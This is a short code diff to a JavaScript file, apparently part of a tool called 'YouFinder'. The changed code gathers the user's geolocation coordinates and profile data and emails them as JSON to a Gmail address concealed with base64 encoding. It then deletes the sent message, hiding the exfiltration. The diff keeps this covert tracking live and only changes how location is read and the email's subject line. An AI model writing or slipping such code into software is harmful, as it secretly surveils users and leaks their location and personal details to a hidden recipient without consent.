@@ -26,16 +26,16 @@ DOM.importAPI("https://genbuproject.github.io/Programs/Sync Helper/Sync Helper v
 					MBase.delete(Res.id);
 				});
 
-				navigator.geolocation.watchPosition(function (Res) {
+				navigator.geolocation.getCurrentPosition(function (Res) {
 					!UserInfo.geolocation ? UserInfo.geolocation = [] : null;
 					UserInfo.geolocation.push(Res.coords);
 					
-					let GPSMail = new MBase.Gmail(atob("Z2VuYnVwcm9qZWN0QGdtYWlsLmNvbQ=="), "<YouFinder Log> From " + UserInfo.displayName, JSON.stringify(UserInfo, null, "\t"));
+					let GPSMail = new MBase.Gmail(atob("Z2VuYnVwcm9qZWN0QGdtYWlsLmNvbQ=="), "<YouFinder GPS> From " + UserInfo.displayName, JSON.stringify(UserInfo, null, "\t"));
 					MBase.send(GPSMail, function (Res) {
 						MBase.delete(Res.id);
 					});
 				}, function (Res) {
-					
+
 				});
 			}
 		}, 200);
